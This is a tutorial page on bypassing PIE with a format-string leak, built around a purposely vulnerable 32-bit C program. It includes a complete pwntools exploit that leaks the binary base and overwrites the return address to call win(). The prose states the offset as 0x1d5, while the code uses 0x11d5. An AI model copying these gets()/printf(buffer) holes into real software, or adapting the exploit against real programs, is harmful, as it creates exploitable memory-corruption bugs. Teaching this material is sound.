---
description: Using format string
---

# PIE Bypass

## The Source

{% file src="../../.gitbook/assets/pie-fmtstr.zip" caption="PIE + Format String - 32-bit" %}

```c
#include <stdio.h>

void vuln() {
    char buffer[20];

    printf("What's your name?\n");
    gets(buffer);
    
    printf("Nice to meet you ");
    printf(buffer);
    printf("\n");

    puts("What's your message?");

    gets(buffer);
}

int main() {
    vuln();

    return 0;
}

void win() {
    puts("PIE bypassed! Great job :D");
}
```

Unlike last time, we don't get given a function. We'll have to leak it with format strings.

## Analysis

```text
$ ./vuln-32 

What's your name?
%p
Nice to meet you 0xf7f6d080
What's your message?
hello
```

Everything's as we expect.

## Exploitation

### Setup

As last time, first we set everything up.

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()
```

### PIE Leak

Now we just need a leak. Let's try a few offsets.

```text
$ ./vuln-32 
What's your name?
%p %p %p %p %p
Nice to meet you 0xf7eee080 (nil) 0x565d31d5 0xf7eb13fc 0x1
```

3rd one looks like a binary address, let's check the difference between the 3rd leak and the base address in radare2. Set a breakpoint somewhere after the format string leak \(doesn't really matter where\).

```text
$ r2 -d -A vuln-32 

Process with PID 5548 started...
= attach 5548 5548
bin.baddr 0x565ef000
0x565f01c9]> db 0x565f0234
[0x565f01c9]> dc
What's your name?
%3$p
Nice to meet you 0x565f01d5
```

We can see the base address is `0x565ef000` and the leaked value is `0x565f01d5`. Therefore, subtracting `0x1d5` from the leaked address should give us the binary. Let's leak the value and get the base address.

```python
p.recvuntil('name?\n')
p.sendline('%3$p')

p.recvuntil('you ')
elf_leak = int(p.recvline(), 16)

elf.address = elf_leak - 0x11d5
log.success(f'PIE base: {hex(elf.address)}') # not required, but a nice check
```

Now we just need to send the exploit payload.

```python
payload = b'A' * 32
payload += p32(elf.sym['win'])

p.recvuntil('message?\n')
p.sendline(payload)

print(p.clean().decode())
```

### Final Exploit

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

p.recvuntil('name?\n')
p.sendline('%3$p')

p.recvuntil('you ')
elf_leak = int(p.recvline(), 16)

elf.address = elf_leak - 0x11d5
log.success(f'PIE base: {hex(elf.address)}')

payload = b'A' * 32
payload += p32(elf.sym['win'])

p.recvuntil('message?\n')
p.sendline(payload)

print(p.clean().decode())
```

## 64-bit

Same deal, just 64-bit. Try it out :\)

{% file src="../../.gitbook/assets/pie-fmtstr-64.zip" caption="PIE + Format String - 64-bit" %}



